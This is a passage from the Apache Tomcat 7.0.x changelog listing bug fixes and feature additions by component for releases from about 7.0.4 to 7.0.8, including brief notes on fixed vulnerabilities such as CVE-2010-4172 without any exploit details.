also logged an error message for every iteration of the loop which lead to large log files being generated. The acceptors have been enhanced to better handle this situation. (markt) | |  | **Jasper** | | --- | | | fix | [50720](https://bz.apache.org/bugzilla/show_bug.cgi?id=50720): Ensure that the use of non-ISO-8859-1 character sets for web.xml does not trigger an error when Jasper parses the web.xml file. (markt) | | --- | --- | | fix | [50726](https://bz.apache.org/bugzilla/show_bug.cgi?id=50726): Ensure that the use of the genStringAsCharArray does not result in String constants that are too long for valid Java code. (markt) | | fix | [50790](https://bz.apache.org/bugzilla/show_bug.cgi?id=50790): Improve method resolution in EL expressions. (markt) | |  | **Cluster** | | --- | | | fix | [50771](https://bz.apache.org/bugzilla/show_bug.cgi?id=50771): Ensure HttpServletRequest#getAuthType() returns the name of the authentication scheme if request has already been authenticated. (kfujino) | | --- | --- | |  | **Web applications** | | --- | | | fix | [50713](https://bz.apache.org/bugzilla/show_bug.cgi?id=50713): Remove roles command from the Manager application. (markt) | | --- | --- | |  | **Tribes** | | --- | | | fix | [50667](https://bz.apache.org/bugzilla/show_bug.cgi?id=50667) ([r1068549](https://svn.apache.org/viewvc?view=rev&rev=1068549)): Allow RPC callers to get confirmation when sending a reply. (fhanik) | | --- | --- | |  | **Other** | | --- | | | fix | [50743](https://bz.apache.org/bugzilla/show_bug.cgi?id=50743): Cache CheckStyle results between builds to speed up validation. Patch provided by Oliver. (markt) | | --- | --- | | | |  | **Tomcat 7.0.8 (markt)** | **released 2011-02-05** | | --- | --- | | | **Catalina** | | --- | | | fix | Fix NPE in CoyoteAdapter when postParseRequest() call fails. (kkolinko) | | --- | --- | | fix | [50709](https://bz.apache.org/bugzilla/show_bug.cgi?id=50709): Make `ApplicationContextFacade` non-final to enable extension. (markt) | | fix | When running under a security manager, user requests may fail with a security exception. (markt) | |  | **Coyote** | | --- | | | fix | Reduce level of log message for invalid URL parameters from WARNING to INFO. (markt) | | --- | --- | | fix | Fix hanging Servlet 3 asynchronous requests when using the APR based AJP connector. (markt) | |  | **Other** | | --- | | | fix | Align server.xml installed by the Windows installer with the one bundled in zip/tar.gz files. The differences are LockOutRealm being used and AccessLogValve being enabled by default. (kkolinko) | | --- | --- | | | |  | **Tomcat 7.0.7 (markt)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | [18462](https://bz.apache.org/bugzilla/show_bug.cgi?id=18462): Don't merge `stdout` and `stderr` internally so users retain the option to treat them separately. (markt) | | --- | --- | | add | [18797](https://bz.apache.org/bugzilla/show_bug.cgi?id=18797): Provide protection against `null` or zero length names being provided for users, roles and groups in the `MemoryRealm` and `UserDatabaseRealm`. (markt) | | update | Improve fix for [50205](https://bz.apache.org/bugzilla/show_bug.cgi?id=50205) to trigger an error earlier if invalid configuration is used. (markt) | | add | Provide additional control over component class loaders, primarily for use when embedding. (markt) | | fix | Fix NPE in RemoteAddrFilter, RemoteHostFilter. (kkolinko) | | fix | [49711](https://bz.apache.org/bugzilla/show_bug.cgi?id=49711): HttpServletRequest#getParts will work in a filter or servlet without an @MultipartConfig annotation or MultipartConfigElement if the new "allowCasualMultipartParsing" context attribute is set to "true". (schultz) | | fix | [49978](https://bz.apache.org/bugzilla/show_bug.cgi?id=49978): Correct another instance where deployment incorrectly failed if a directory in the work area already existed. (markt) | | fix | [50582](https://bz.apache.org/bugzilla/show_bug.cgi?id=50582): Refactor access logging so chunked encoding is not forced for all requests if bytes sent is logged. (markt) | | fix | [50597](https://bz.apache.org/bugzilla/show_bug.cgi?id=50597): Don't instantiate a new instance of a Filter if an instance was provided via the `ServletContext.addFilter(String, Filter)` method. Patch provided by Ismael Juma. (markt) | | fix | [50598](https://bz.apache.org/bugzilla/show_bug.cgi?id=50598): Correct URL for Manager text interface. (markt) | | fix | [50620](https://bz.apache.org/bugzilla/show_bug.cgi?id=50620): Stop exceptions that occur during `Session.endAccess()` from preventing the normal completion of `Request.recycle()`. (markt) | | fix | [50629](https://bz.apache.org/bugzilla/show_bug.cgi?id=50629): Make `StandardContext.bindThread()` and `StandardContext.unbindThread()` protected to allow use by sub-classes. (markt) | | update | Use getName() instead of logName() in error messages in StandardContext. (kkolinko) | | fix | [50642](https://bz.apache.org/bugzilla/show_bug.cgi?id=50642): Move the `sun.net.www.http.HttpClient` keep-alive thread memory leak protection from the JreMemoryLeakPreventionListener to the WebappClassLoader since the thread that triggers the memory leak is created on demand. (markt) | | fix | [50673](https://bz.apache.org/bugzilla/show_bug.cgi?id=50673): Improve Catalina shutdown when running as a service. Do not call System.exit(). (kkolinko) | | fix | [50683](https://bz.apache.org/bugzilla/show_bug.cgi?id=50683): Ensure annotations are scanned when `unpackWARs` is set to `false` in the Host where a web application is deployed. (markt) | | fix | Improve HTTP specification compliance in support of `Accept-Language` header. This protects from known exploit of the Oracle JVM bug that triggers a DoS, CVE-2010-4476. (kkolinko) | |  | **Coyote** | | --- | | | fix | Prevent possible thread exhaustion if a Comet timeout event takes a while to complete. (markt) | | --- | --- | | fix | Prevent multiple Comet END events if the CometServlet calls `event.close()` during an END event. (markt) | | fix | [50325](https://bz.apache.org/bugzilla/show_bug.cgi?id=50325): When the JVM indicates support for RFC 5746, disable Tomcat's `allowUnsafeLegacyRenegotiation` configuration attribute and use the JVM configuration to control renegotiation. (markt) | | fix | [50405](https://bz.apache.org/bugzilla/show_bug.cgi?id=50405): Fix occasional NPE when using NIO connector and Comet. (markt) | | fix | Ensure correct recycling of NIO input filters when processing Comet events. (markt) | | fix | [50627](https://bz.apache.org/bugzilla/show_bug.cgi?id=50627): Correct interaction of NIO socket and Poller when processing Comet events. (markt) | | fix | Correct interaction of APR socket and Poller when processing Comet events. (markt) | | fix | [50631](https://bz.apache.org/bugzilla/show_bug.cgi?id=50631): InternalNioInputBuffer should honor `maxHttpHeadSize`. (kkolinko) | |  | **Jasper** | | --- | | | fix | Improve special case handling of `javax.servlet.jsp.el.ScopedAttributeELResolver` in `javax.el.CompositeELResolver` to handle sub-classes. (markt) | | --- | --- | | update | [15688](https://bz.apache.org/bugzilla/show_bug.cgi?id=15688): Use fully-qualified class names in generated jsp files to avoid naming conflicts with user imports. (markt) | | fix | [46819](https://bz.apache.org/bugzilla/show_bug.cgi?id=46819): Remove redundant object instantiations in JspRuntimeLibrary. Patch provided by Anthony Whitford. (markt) | | update | Improve error message when EL identifiers are not valid Java identifiers and use i18n for the error message. (markt) | | fix | [50680](https://bz.apache.org/bugzilla/show_bug.cgi?id=50680): Prevent an NPE when using tag files from an exploded JAR file, e.g. from within an IDE. Patch provided by Larry Isaacs. (markt) | |  | **Cluster** | | --- | | | fix | [50591](https://bz.apache.org/bugzilla/show_bug.cgi?id=50591): Fix NPE in ReplicationValve. (kkolinko) | | --- | --- | | add | Internationalise the log messages for the FarmWarDeployer. (markt) | | fix | [50600](https://bz.apache.org/bugzilla/show_bug.cgi?id=50600): Prevent a `ConcurrentModificationException` when removing a WAR file via the FarmWarDeployer. (markt) | | fix | Be consistent with locks on sessionCreationTiming, sessionExpirationTiming in DeltaManager.resetStatistics(). (kkolinko) | | fix | [50648](https://bz.apache.org/bugzilla/show_bug.cgi?id=50648): Correctly set the interrupt status if a thread using `RpcChannel` is interrupted waiting for a message reply. Based on a patch by Olivier Costet. (markt) | | fix | [50646](https://bz.apache.org/bugzilla/show_bug.cgi?id=50646): Ensure larger Tribes messages are fully read. Patch provided by Olivier Costet. (markt) | | fix | [50679](https://bz.apache.org/bugzilla/show_bug.cgi?id=50679): Update the FarmWarDeployer to support parallel deployment. (markt) | |  | **Web applications** | | --- | | | fix | [22278](https://bz.apache.org/bugzilla/show_bug.cgi?id=22278): Add a commented out `RemoteAddrValve` that limits access to the Manager and Host Manager applications to localhost. Based on a patch by Yann Cébron. (markt) | | --- | --- | | fix | Correct a handful of Javadoc warnings. (markt) | | add | Provide additional detail about how web application version order is determined when using parallel deployment. (markt) | | fix | Correct the documentation for the recoveryCount count attribute of the the default cluster membership. (markt) | | fix | [50441](https://bz.apache.org/bugzilla/show_bug.cgi?id=50441): Clarify when it is valid to set the docBase attribute in a Context element. (markt) | | fix | [50526](https://bz.apache.org/bugzilla/show_bug.cgi?id=50526): Provide additional documentation on configuring JavaMail resources. (markt) | | fix | [50599](https://bz.apache.org/bugzilla/show_bug.cgi?id=50599): Use correct names of roles required to access the Manager application. (markt) | |  | **Other** | | --- | | | add | Extend the Checkstyle tests to check for license headers. (markt) | | --- | --- | | fix | Modify the build script so a release build always rebuilds the dependencies to ensure that the correct Tomcat version appears in the manifest. (markt) | | fix | Code clean-up to remove unused code and reduce IDE warnings. (markt) | | fix | [50601](https://bz.apache.org/bugzilla/show_bug.cgi?id=50601): Code clean-up. Patch provided by sebb. (markt) | | fix | [50606](https://bz.apache.org/bugzilla/show_bug.cgi?id=50606): Improve CGIServlet: Provide support for specifying empty value for the `executable` init-param. Provide support for explicit additional arguments for the executable. Those were broken when implementing fix for bug [49657](https://bz.apache.org/bugzilla/show_bug.cgi?id=49657). (kkolinko) | | | |  | **Tomcat 7.0.6 (markt)** | **released 2011-01-14** | | --- | --- | | | **General** | | --- | | | update | Update to Apache Commons Daemon 1.0.5. (mturk) | | --- | --- | |  | **Catalina** | | --- | | | fix | [8705](https://bz.apache.org/bugzilla/show_bug.cgi?id=8705): `org.apache.catalina.SessionListener` now extends `java.util.EventListener`. (markt) | | --- | --- | | add | [10526](https://bz.apache.org/bugzilla/show_bug.cgi?id=10526): Add an option to the `Authenticator`s to force the creation of a session on authentication which may offer some performance benefits. (markt) | | update | [10972](https://bz.apache.org/bugzilla/show_bug.cgi?id=10972): Improve error message if the className attribute is missing on an element in server.xml where it is required. (markt) | | update | [48692](https://bz.apache.org/bugzilla/show_bug.cgi?id=48692): Provide option to parse `application/x-www-form-urlencoded` PUT requests. (schultz) | | update | [48822](https://bz.apache.org/bugzilla/show_bug.cgi?id=48822): Include context name in case of error while stopping or starting a context during its reload. Patch provided by Marc Guillemot. (slaurent) | | add | [48837](https://bz.apache.org/bugzilla/show_bug.cgi?id=48837): Extend thread local memory leak detection to include classes loaded by subordinate class loaders to the web application's class loader such as the Jasper class loader. Based on a patch by Sylvain Laurent. (markt) | | add | [48973](https://bz.apache.org/bugzilla/show_bug.cgi?id=48973): Avoid creating a SESSIONS.ser file when stopping an application if there's no session. Patch provided by Marc Guillemot. (slaurent) | | fix | [49000](https://bz.apache.org/bugzilla/show_bug.cgi?id=49000): No longer accept specification invalid name only cookies by default. This behaviour can be restored using a system property. (markt) | | add | [49159](https://bz.apache.org/bugzilla/show_bug.cgi?id=49159): Improve memory leak protection by renewing threads of the pool when a web application is stopped. (slaurent) | | fix | [49372](https://bz.apache.org/bugzilla/show_bug.cgi?id=49372): Re-fix after connector re-factoring. If connector initialisation fails (e.g. if a port is already in use) do not trigger an `LifecycleException` for an invalid state transition. (markt) | | fix | [49543](https://bz.apache.org/bugzilla/show_bug.cgi?id=49543): Allow Tomcat to use shared data sources with per application credentials. (fhanik) | | fix | [49650](https://bz.apache.org/bugzilla/show_bug.cgi?id=49650): Remove unnecessary entries package.access property defined in catalina.properties. Patch provided by Owen Farrell. (markt) | | fix | [50106](https://bz.apache.org/bugzilla/show_bug.cgi?id=50106): Correct several MBean descriptors. Patch provided by Eiji Takahashi. (markt) | | update | Further performance improvements to session ID generation. Remove legacy configuration options that are no longer required. Provide additional options to control the `SecureRandom` instances used to generate session IDs. (markt) | | fix | [50201](https://bz.apache.org/bugzilla/show_bug.cgi?id=50201): Update the access log reference in `StandardEngine` when the ROOT web application is redeployed, started, stopped or defaultHost is changed. (markt/kkolinko) | | add | [50282](https://bz.apache.org/bugzilla/show_bug.cgi?id=50282): Load `javax.security.auth.login.Configuration` with `JreMemoryLeakPreventionListener` to avoid memory leak when stopping a web application that would use JAAS. (slaurent) | | fix | [50351](https://bz.apache.org/bugzilla/show_bug.cgi?id=50351): Fix the regression that broke BeanFactory resources caused by the previous fix for [50159](https://bz.apache.org/bugzilla/show_bug.cgi?id=50159). (markt) | | fix | [50352](https://bz.apache.org/bugzilla/show_bug.cgi?id=50352): Ensure that `AsyncListener.onComplete()` is fired when `AsyncContext.complete()` is called. (markt) | | fix | [50358](https://bz.apache.org/bugzilla/show_bug.cgi?id=50358): Set the correct LifecycleState when stopping instances of the deprecated Embedded class. (markt) | | fix | Further Lifecycle refactoring for Connectors and associated components. (markt) | | fix | Correct handling of versioned web applications in deployer. (markt) | | fix | Correct removal of `LifeCycleListener`s from `Container`s via JMX. (markt) | | fix | Don't use `null`s to construct log messages. (markt) | | fix | Code clean-up. Replace use of inefficient constructors with more efficient alternatives. (markt) | | fix | [50411](https://bz.apache.org/bugzilla/show_bug.cgi?id=50411): Ensure sessions are removed from the `Store` associated with a `PersistentManager`. (markt) | | fix | [50413](https://bz.apache.org/bugzilla/show_bug.cgi?id=50413): Ensure 304 responses are not returned when using static files as error pages. (markt/kkolinko) | | fix | [50448](https://bz.apache.org/bugzilla/show_bug.cgi?id=50448): Fix possible `IllegalStateException` caused by recent session management refactoring. (markt) | | fix | Ensure aliases settings for a context are retained after a context is reloaded. (markt) | | fix | Log a warning if context.xml files define values for properties that do not exist (e.g. if there is a typo in a property name). (markt) | | fix | [50453](https://bz.apache.org/bugzilla/show_bug.cgi?id=50453): Correctly handle multiple `X-Forwarded-For` headers in the RemoteIpFilter and RemoteIpValve. Patch provided by Jim Riggs. (markt) | | add | [50541](https://bz.apache.org/bugzilla/show_bug.cgi?id=50541): Add support for setting the size limit and time limit for LDAP searches when using the JNDI Realm with `userSearch`. (markt) | | update | All configuration options that use regular expression now require a single regular expression (using `java.util.regex`) rather than a list of comma-separated or semi-colon-separated expressions. (markt) | | fix | [50496](https://bz.apache.org/bugzilla/show_bug.cgi?id=50496): Bytes sent in the access log are now counted after compression, chunking etc rather than before. (markt) | | fix | [50550](https://bz.apache.org/bugzilla/show_bug.cgi?id=50550): When a new directory is created (e.g. via WebDAV) ensure that a subsequent request for that directory does not result in a 404 response. (markt) | | fix | [50554](https://bz.apache.org/bugzilla/show_bug.cgi?id=50554): Code clean up. (markt) | | add | [50556](https://bz.apache.org/bugzilla/show_bug.cgi?id=50556): Improve JreMemoryLeakPreventionListener to prevent a potential class loader leak caused by a thread spawned when the class `com.sun.jndi.ldap.LdapPoolManager` is initialized and the system property `com.sun.jndi.ldap.connect.pool.timeout` is set to a value greater than 0. (slaurent) | |  | **Coyote** | | --- | | | fix | [47319](https://bz.apache.org/bugzilla/show_bug.cgi?id=47319): Return the client's IP address rather than null for calls to `getRemoteHost()` when the APR connector is used with `enableLookups="true"` but the IP address is not resolveable. (markt) | | --- | --- | | add | [50108](https://bz.apache.org/bugzilla/show_bug.cgi?id=50108): Add get/set methods for Connector property minSpareThreads. Patch provided by Eiji Takahashi. (markt) | | fix | [50360](https://bz.apache.org/bugzilla/show_bug.cgi?id=50360): Provide an option to control when the socket associated with a connector is bound. By default, the socket is bound on `Connector.init()` and released on `Connector.destroy()` as per the current behaviour but this can be changed so that the socket is bound on `Connector.start()` and released on `Connector.stop()`. This fix also includes further Lifecycle refactoring for Connectors and associated components. (markt) | | fix | Remove a huge memory leak in the NIO connector introduced by the fix for [49884](https://bz.apache.org/bugzilla/show_bug.cgi?id=49884). (markt) | | fix | [50467](https://bz.apache.org/bugzilla/show_bug.cgi?id=50467): Protected against NPE triggered by a race condition that causes the NIO poller to fail, preventing the processing of further requests. (markt) | |  | **Jasper** | | --- | | | add | [13731](https://bz.apache.org/bugzilla/show_bug.cgi?id=13731): Make variables in `_jspService()` method final where possible. (markt) | | --- | --- | | fix | [50408](https://bz.apache.org/bugzilla/show_bug.cgi?id=50408): Fix `NoSuchMethodException` when using scoped variables with EL method invocation. (markt) | | fix | [50460](https://bz.apache.org/bugzilla/show_bug.cgi?id=50460): Avoid a memory leak caused by using a cached exception instance in `JspDocumentParser` and `ProxyDirContext`. (kkolinko) | | fix | [50500](https://bz.apache.org/bugzilla/show_bug.cgi?id=50500): Use correct coercions (as per the EL spec) for arithmetic operations involving string values containing '.', 'e' or 'E'. Based on a patch by Brian Weisleder. (markt) | |  | **Cluster** | | --- | | | add | [50185](https://bz.apache.org/bugzilla/show_bug.cgi?id=50185): Add additional trace level logging to Tribes to assist with fault diagnosis. Based on a patch by Ariel. (markt) | | --- | --- | | fix | Don't try and obtain session data from the cluster if the current node is the only node in the cluster. Log requesting session data as INFO rather than WARNING. (markt) | | fix | [50503](https://bz.apache.org/bugzilla/show_bug.cgi?id=50503): When web application has a version, Engine level Clustering works correctly. (kfujino) | | fix | [50547](https://bz.apache.org/bugzilla/show_bug.cgi?id=50547): Add time stamp for CHANGE\_SESSION\_ID message and SESSION\_EXPIRED message. (kfujino) | |  | **Web applications** | | --- | | | fix | [21157](https://bz.apache.org/bugzilla/show_bug.cgi?id=21157): Ensure cookies are written before the response is committed in the Cookie example. Patch provided by Stefan Radzom. (markt) | | --- | --- | | add | [50294](https://bz.apache.org/bugzilla/show_bug.cgi?id=50294): Add more information to documentation regarding format of configuration files. Patch provided by Luke Meyer. (markt) | | fix | Correctly validate provided context path so sessions for the ROOT web application can be viewed through the HTML Manager. (markt) | | update | Improve documentation of database connection factory. (rjung) | | fix | [50488](https://bz.apache.org/bugzilla/show_bug.cgi?id=50488): Update classpath required when using jsvc and add a note regarding server VMs. (markt) | | fix | Further filtering of Manager display output. (kkolinko) | |  | **Other** | | --- | | | fix | Don't configure Windows installer to use PID file since it is not removed when the service stops which prevents the service from starting. (markt) | | --- | --- | | fix | [14416](https://bz.apache.org/bugzilla/show_bug.cgi?id=14416): Make `TagLibraryInfo.getTag()` more robust at handling `null`s. (markt) | | fix | [50552](https://bz.apache.org/bugzilla/show_bug.cgi?id=50552): Avoid NPE that hides error message when using Ant tasks. (schultz) | | add | Provide two alternative locations for the libraries downloaded from the ASF web site at build time. Use the main distribution site as default and the archive one as fallback. (kkolinko) | | | |  | **Tomcat 7.0.5 (markt)** | **beta, 2010-12-01** | | --- | --- | | | **General** | | --- | | | update | Update to Apache Commons Daemon 1.0.4. (mturk) | | --- | --- | |  | **Catalina** | | --- | | | fix | [3839](https://bz.apache.org/bugzilla/show_bug.cgi?id=3839): Provide a mechanism to gracefully handle the case where users book-mark the form login page or otherwise misuse the FORM authentication process. Based on a suggestion by Mark Morris. (markt) | | --- | --- | | fix | [49180](https://bz.apache.org/bugzilla/show_bug.cgi?id=49180): Add option to disable log rotation in juli FileHandler. Patch provided by Pid (pidster at apache). (funkman) | | fix | [49991](https://bz.apache.org/bugzilla/show_bug.cgi?id=49991): Ensure servlet request listeners are fired for the login and error pages during FORM authentication. (markt) | | fix | [50107](https://bz.apache.org/bugzilla/show_bug.cgi?id=50107): When removing a Host via JMX, do not attempt to destroy the host's pipeline twice. Patch provided by Eiji Takahashi. (markt) | | fix | [50138](https://bz.apache.org/bugzilla/show_bug.cgi?id=50138): Fix threading issues in `org.apache.catalina.security.SecurityUtil`. (markt) | | fix | [50157](https://bz.apache.org/bugzilla/show_bug.cgi?id=50157): Ensure MapperListener is only added to a container object once. (markt) | | fix | [50159](https://bz.apache.org/bugzilla/show_bug.cgi?id=50159): Add a new attribute for `<Resource>` elements, `singleton`, that controls whether or not a new object is created every time a JNDI lookup is performed to obtain the resource. The default value is `true`, which will return the same instance of the resource in every JNDI lookup. (markt) | | fix | [50168](https://bz.apache.org/bugzilla/show_bug.cgi?id=50168): Separate the `Lifecycle.DESTROY_EVENT` into `Lifecycle.BEFORE_DESTROY_EVENT` and `Lifecycle.AFTER_DESTROY_EVENT`. Use the additional state to ensure that `Context` objects are only destroyed once. (markt) | | fix | [50169](https://bz.apache.org/bugzilla/show_bug.cgi?id=50169): Ensure that when a Container is started that it doesn't try and register with the mapper unless its parent has already started. Patch provided by Eiji Takahashi. (markt) | | add | [50222](https://bz.apache.org/bugzilla/show_bug.cgi?id=50222): Modify memory leak prevention code so it pins the system class loader in memory rather than the common class loader, which is better for embedded systems. Patch provided by Christopher Schultz. (markt) | | add | Improve debug logging for MapperListener registration. (markt) | | add | Expose names of LifecycleListeners and ContainerListeners for StandardContext via JMX. (markt) | | add | Add a new option, `resourceOnlyServlets`, to Context elements that provides a mechanism for working around the issues caused by new requirements for welcome file mapping introduced in Servlet 3.0. By default, the existing Tomcat 6.0.x welcome file handling is used. (markt) | | fix | Make Tomcat more tolerant of `null` when generating JMX names for Valves. (markt) | | fix | Make AccessLogValve attribute `enabled` changeable via JMX. (pero) | | fix | Correct infinite loop if `ServletRequest.startAsync(ServletRequest, ServletResponse)` was called. (markt) | | fix | [50232](https://bz.apache.org/bugzilla/show_bug.cgi?id=50232): Remove dependency between StoreBase and PersistentManager and associated code clean-up. Patch provided by Tiago Batista. (markt) | | fix | [50252](https://bz.apache.org/bugzilla/show_bug.cgi?id=50252): Prevent ClassCastException when using a <ResourceLink>. Patch provided by Eiji Takahashi. (markt) | | add | Reduce synchronization in session managers to improve performance of session creation. (markt) | | fix | If starting children automatically when adding them to a container (e.g. when adding a Context to a Host) don't lock the parent's set of children whilst the new child is being started since this can block other threads and cause issues such as lost cluster messages. (markt) | | add | Implement support for parallel deployment. This allows multiple versions of the same web application to be deployed to the same context path at the same time. Users without a current session will be mapped to the latest version of the web application. Users with a current session will continue to use the version of the web application with which the session is associated until the session expires. (markt) | | fix | [50308](https://bz.apache.org/bugzilla/show_bug.cgi?id=50308): Allow asynchronous request processing to call `AsyncContext.dispatch()` once the asynchronous request has timed out. (markt) | | add | Make memory leak prevention code that clears ThreadLocal instances more robust against objects with toString() methods that throw exceptions. (markt) | |  | **Coyote** | | --- | | | fix | [49860](https://bz.apache.org/bugzilla/show_bug.cgi?id=49860): Complete support for handling trailing headers in chunked HTTP requests. (markt) | | --- | --- | | add | Impose a limit on the length of the trailing headers. The limit is configurable with a system property and is `8192` by default. (kkolinko) | | fix | [50207](https://bz.apache.org/bugzilla/show_bug.cgi?id=50207): Ensure Comet timeout events are triggered. This bug was a regression triggered by the fix for [49884](https://bz.apache.org/bugzilla/show_bug.cgi?id=49884). (markt) | |  | **Jasper** | | --- | | | fix | [49297](https://bz.apache.org/bugzilla/show_bug.cgi?id=49297): Enforce the rules in the JSP specification for parsing the attributes of custom and standard actions that require that the attribute names are unique within an element and that there is whitespace before the attribute name. The whitespace test can be disabled by setting the system property `org.apache.jasper.compiler.Parser.STRICT_WHITESPACE` to `false`. Attributes of the page directive have slightly different rules. The implementation of that part of the fix is based on a patch by genspring. (markt) | | --- | --- | | fix | [50105](https://bz.apache.org/bugzilla/show_bug.cgi?id=50105): When processing composite EL expressions use `Enum.name()` rather than `Enum.toString()` as required by the EL specification. (markt) | | fix | Fix minor thread-safety and performance issues in the implementation of `maxLoadedJsps`. (rjung) | | add | Add support for unloading JSPs that have not been requested for a long time using the new parameter `jspIdleTimeout`. (rjung) | | add | Add logging and JMX support to JSP unloading. (rjung) | | fix | [50192](https://bz.apache.org/bugzilla/show_bug.cgi?id=50192): Improve performance for EL when running under a security manager. Based on a patch by Robert Goff. (markt) | | fix | [50228](https://bz.apache.org/bugzilla/show_bug.cgi?id=50228): Improve recycling of `BodyContentImpl`. This avoids keeping a cached reference to a webapp-provided Writer used in JspFragment.invoke() calls. (kkolinko) | | add | [50273](https://bz.apache.org/bugzilla/show_bug.cgi?id=50273): Provide a workaround for an HP-UX issue that can result in large numbers of SEVERE log messages appearing in the logs as a result of normal operation. (markt) | | fix | [50293](https://bz.apache.org/bugzilla/show_bug.cgi?id=50293): Increase the size of internal ELResolver array from 2 to 8 since in typical usage there are at least 5 resolvers. Based on a patch by Robert Goff. (markt) | |  | **Cluster** | | --- | | | fix | Add support for maxActiveSessions attribute to BackupManager. (kfujino) | | --- | --- | | fix | Improve sending an access message in DeltaManager. maxInactiveInterval of not Manager but the session is used. If maxInactiveInterval is negative, an access message is not sending. (kfujino) | | fix | [50183](https://bz.apache.org/bugzilla/show_bug.cgi?id=50183): BIO sender was not scheduling tasks to the executor during normal operation. Patch provided by Ariel. (markt) | | fix | [50184](https://bz.apache.org/bugzilla/show_bug.cgi?id=50184): Add an option to the RpcChannel to enable the Channel send options to be set for the reply message. Based on a patch by Ariel. (markt) | | fix | Ensure that a new Context waiting for session data from other nodes in the cluster does not block the processing of clustering messages for other Contexts. (markt) | |  | **Web applications** | | --- | | | fix | [49426](https://bz.apache.org/bugzilla/show_bug.cgi?id=49426): Localize messages in the Manager application based on the Locale of the user rather than the default Locale of the server. (markt) | | --- | --- | | fix | Localize messages in the Host Manager application based on the Locale of the user rather than the default Locale of the server. (markt) | | add | [50242](https://bz.apache.org/bugzilla/show_bug.cgi?id=50242): Provide a sample log4j configuration that more closely matches the default JULI configuration. Patch provided by Christopher Schultz. (markt) | | add | Restore the ability to edit the contents of /WEB-INF and /META-INF via WebDAV via the provision of a new configuration option, allowSpecialPaths. (markt) | | fix | Correct broken links for on-line JavaDocs. (markt) | | fix | [50230](https://bz.apache.org/bugzilla/show_bug.cgi?id=50230): Add new DistributedManager interface that is implemented by the Backup Manager to remove circular dependency between tomcat-catalina-ha and tomcat-catalina modules. Also allows third-party distributed Manager implementations to report full session information through the HTML Manager. (markt) | | update | Improve Tomcat Logging documentation. (kkolinko) | | fix | [50303](https://bz.apache.org/bugzilla/show_bug.cgi?id=50303): Update JNDI how-to to reflect the new JavaMail download location and that JAF is now included in Java SE 6. (markt) | | fix | Fix ordering functionality on sessions page for the HTML Manager application. (markt) | | fix | Fix primary sessions not always being treated as such in the HTML Manager application. (markt) | | fix | Fix message not being displayed after session attribute removal in the HTML Manager application. (markt) | | fix | [50310](https://bz.apache.org/bugzilla/show_bug.cgi?id=50310): Fix display of Servlet information in the Manager application. (markt) | | fix | CVE-2010-4172: Multiple XSS in the Manager application. (markt/kkolinko) | | fix | [50316](https://bz.apache.org/bugzilla/show_bug.cgi?id=50316): Fix display of negative values in the Manager application. (kkolinko) | | fix | [50318](https://bz.apache.org/bugzilla/show_bug.cgi?id=50318): Avoid NPE when trying to view session detail for an expired session in the Manager application. (markt) | |  | **Other** | | --- | | | fix | Correct a handful of Javadoc warnings. (markt) | | --- | --- | | fix | [22965](https://bz.apache.org/bugzilla/show_bug.cgi?id=22965): Fix some typos and formatting issues in the global web.xml file. Based on a patch by Yann Cébron. (markt) | | add | Extend Checkstyle validation checks to check for unused imports. (markt) | | fix | General code clean-up to reduce (not eliminate) the number of warnings reported by IDEs. (markt) | | fix | [50140](https://bz.apache.org/bugzilla/show_bug.cgi?id=50140): Don't ignore a user specified installation directory when performing a silent install with the Windows installer on 64-bit platforms. (markt) | | update | Reimplemented Windows installer dialogs, using modern libraries (nsDialogs, MUI2). (kkolinko) | | add | When installing with the Windows installer on 64-bit platforms, allow the user to select either a 32-bit JDK or a 64-bit JDK. If a 32-bit JDK is selected, the 32-bit service wrapper and the 32-bit native DLL will be installed. If a 64-bit JDK is selected, the 64-bit service wrapper and the 64-bit native DLL will be installed. (markt/kkolinko) | | add | Create Windows shortcuts for the Manager and Host Manager webapps. (kkolinko) | | add | Support /? command line option in the Windows Installer. (kkolinko) | | add | Display and allow to change roles for the Tomcat admin user in the Windows installer. (kkolinko) | | fix | In the Windows installer: do not leave stale `server.xml` and `tomcat-users.xml` fragments in the $TEMP folder. (kkolinko) | | update | [49819](https://bz.apache.org/bugzilla/show_bug.cgi?id=49819): Redesign of home page by Pid (pidster at apache). (timw) | | | |  | **Tomcat 7.0.4 (markt)** | **beta, 2010-10-21** | | --- | --- | | | **Catalina** | | --- | | | fix | [49428](https://bz.apache.org/bugzilla/show_bug.cgi?id=49428): Re-implement the fix for bug [49428](https://bz.apache.org/bugzilla/show_bug.cgi?id=49428) – namespace issues for some Microsoft WebDAV clients. (kkolinko) | | --- | --- | | fix | [49669](https://bz.apache.org/bugzilla/show_bug.cgi?id=49669): Fix memory leak triggered by using the deprecated javax.security.auth.Policy class. (markt) | | fix | [49922](https://bz.apache.org/bugzilla/show_bug.cgi?id=49922): Don't add filter twice to filter chain if the filter matches more than one URL pattern and/or Servlet name. Patch provided by heyoulin. (markt) | | fix | [49937](https://bz.apache.org/bugzilla/show_bug.cgi?id=49937): Use an InstanceManager when creating an AsyncListener through the AsyncContext to ensure annotations are processed. Based on a patch by David Jencks. (markt) | | fix | To avoid NoSuchMethodException, xmlValidation and xmlNamespaceAware are removed from the createStandardHost definition of mbeans-descriptors.xml. (kfujino) | | fix | [49945](https://bz.apache.org/bugzilla/show_bug.cgi?id=49945): Continue improvements to JMX. Fix a handful of attributes that were showing as Unavailable in JConsole. Patch provided by Chamith Buddhika. (markt) | | fix | [49952](https://bz.apache.org/bugzilla/show_bug.cgi?id=49952): Allow ServletContainerInitializers to add listeners to a web application. Patch provided by David Jencks. (markt) | | fix | [49956](https://bz.apache.org/bugzilla/show_bug.cgi?id=49956): Handle case when @Resource annotation uses the full JNDI name for a resource. Based on a patch by Gurkan Erdogdu. (markt) | | fix | [49557](https://bz.apache.org/bugzilla/show_bug.cgi?id=49557): Correct regression due to Lifecycle refactoring that cleared all work directories (with compiled JSPs and persisted sessions) when Tomcat was stopped. (markt) | | fix | [49978](https://bz.apache.org/bugzilla/show_bug.cgi?id=49978): Correctly handle the case when a directory expected to be created during web application start is already present. Rather than throwing an exception and failing to start, allow the web application to start normally. (markt) | | fix | [49987](https://bz.apache.org/bugzilla/show_bug.cgi?id=49987): Fix thread safety issue with population of servlet context initialization parameters. (markt) | | fix | [49994](https://bz.apache.org/bugzilla/show_bug.cgi?id=49994): As per the Java EE 6 specification, return a new object instance for each JNDI look up of a resource reference. (markt) | | fix | [50015](https://bz.apache.org/bugzilla/show_bug.cgi?id=50015): Re-factor dynamic servlet security implementation to make extensions, such as JACC implementations, simpler. Patch provided by David Jencks. (markt) | | fix | [50016](https://bz.apache.org/bugzilla/show_bug.cgi?id=50016): Re-factor 